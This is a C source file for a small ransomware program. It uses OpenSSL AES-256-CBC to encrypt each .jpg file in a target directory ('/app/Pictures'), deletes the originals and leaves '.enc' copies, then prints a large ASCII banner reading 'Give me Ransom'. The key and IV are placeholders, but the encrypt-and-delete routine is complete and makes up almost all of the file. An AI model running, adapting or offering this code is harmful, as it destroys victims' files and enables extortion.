#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <stdbool.h>

const char *AES_KEY = "<REPLACE_KEY>";
const char *AES_IV  = "<REPLACE_IV>";
const char *TARGET_DIR = "/app/Pictures";

#define BUFSIZE 4096

bool encrypt_file(const char *input, const char *output, const char *key, const char *iv) {
    FILE *infp = fopen(input, "rb");
    FILE *outfp = fopen(output, "wb");
    if (!infp || !outfp) {
        if (infp) fclose(infp);
        if (outfp) fclose(outfp);
        return false;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fclose(infp); fclose(outfp);
        return false;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL,
            (const unsigned char*)key,
            (const unsigned char*)iv) != 1) {
        EVP_CIPHER_CTX_free(ctx); fclose(infp); fclose(outfp);
        return false;
    }

    unsigned char inbuf[BUFSIZE];
    unsigned char outbuf[BUFSIZE + EVP_MAX_BLOCK_LENGTH];
    int outlen = 0;
    size_t read_bytes;
    bool ok = true;

    while ((read_bytes = fread(inbuf, 1, BUFSIZE, infp)) > 0) {
        if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, read_bytes) != 1) {
            ok = false; break;
        }
        fwrite(outbuf, 1, outlen, outfp);
    }
    if (ok && EVP_EncryptFinal_ex(ctx, outbuf, &outlen) == 1) {
        fwrite(outbuf, 1, outlen, outfp);
    } else {
        ok = false;
    }

    EVP_CIPHER_CTX_free(ctx);
    fclose(infp);
    fclose(outfp);
    return ok;
}

int has_jpg_extension(const char *filename) {
    const char *ext = strrchr(filename, '.');
    return ext && strcmp(ext, ".jpg") == 0;
}

int main() {
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    DIR *dir = opendir(TARGET_DIR);
    if (!dir) {
        fprintf(stderr, "[-] Target directory not found: %s\n", TARGET_DIR);
        return 1;
    }

    struct dirent *entry;
    char input[512], output[520];
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && has_jpg_extension(entry->d_name)) {
            snprintf(input, sizeof(input), "%s/%s", TARGET_DIR, entry->d_name);
            snprintf(output, sizeof(output), "%s.enc", input);
            if (encrypt_file(input, output, AES_KEY, AES_IV)) {
                remove(input);
            } else {
                fprintf(stderr, "[-] Failed: %s\n", input);
            }
        }
    }
    closedir(dir);

const char* banner = R"(                                                        
                                                            ;i.
                                                             M$L                    .;i.
                                                             M$Y;                .;iii;;.
                                                            ;$YY$i._           .iiii;;;;;
                                                           .iiiYYYYYYiiiii;;;;i;iii;; ;;;
    _____ _                                               .;iYYYYYYiiiiiiYYYiiiiiii;;  ;;;
   / ____(_)                                           .YYYY$$$$YYYYYYYYYYYYYYYYiii;; ;;;;
  | |  __ ___   _____   _ __ ___   ___               .YYY$$$$$$YYYYYY$$$$iiiY$$$$$$$ii;;;;
  | | |_ | \ \ / / _ \ | '_ ` _ \ / _ \             :YYYF`,  TYYYYY$$$$$YYYYYYYi$$$$$iiiii;
  | |__| | |\ V /  __/ | | | | | |  __/             Y$MM: \  :YYYY$$P"````"T$YYMMMMMMMMiiYY.
   \_____|_| \_/ \___| |_| |_| |_|\___|          `.;$$M$$b.,dYY$$Yi; .(     .YYMMM$$$MMMMYY
  |  __ \                                      .._$MMMMM$!YYYYYYYYYi;.`"  .;iiMMM$MMMMMMMYY
  | |__) |__ _ _ __  ___  ___  _ __ ___         ._$MMMP` ```""4$$$$$iiiiiiii$MMMMMMMMMMMMMY;
  |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \         MMMM$:       :$$$$$$$MMMMMMMMMMM$$MMMMMMMYYL
  | | \ \ (_| | | | \__ \ (_) | | | | | |      :MMMM$$.    .;PPb$$$$MMMMMMMMMM$$$$MMMMMMiYYU:
  |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|       iMM$$;;: ;;;;i$$$$$$$MMMMM$$$$MMMMMMMMMMYYYYY
                                                 `$$$$i .. ``:iiii!*\`.$$$$$$$$$MMMMMMM$YiYYY
                                                 :Y$$iii;;;.. ` ..;;i$$$$$$$$$MMMMMM$$YYYYiYY:
                                                  :$$$$$iiiiiii$$$$$$$$$$$MMMMMMMMMMYYYYiiYYYY.
                                                   `$$$$$$$$$$$$$$$$$$$$MMMMMMMM$YYYYYiiiYYYYYY
                                                    YY$$$$$$$$$$$$$$$$MMMMMMM$$YYYiiiiiiYYYYYYY
                                                   :YYYYYY$$$$$$$$$$$$$$$$$$YYYYYYYiiiiYYYYYYi'

)";
   
    printf("%s\n", banner);
    exit(0);
    return 0;
}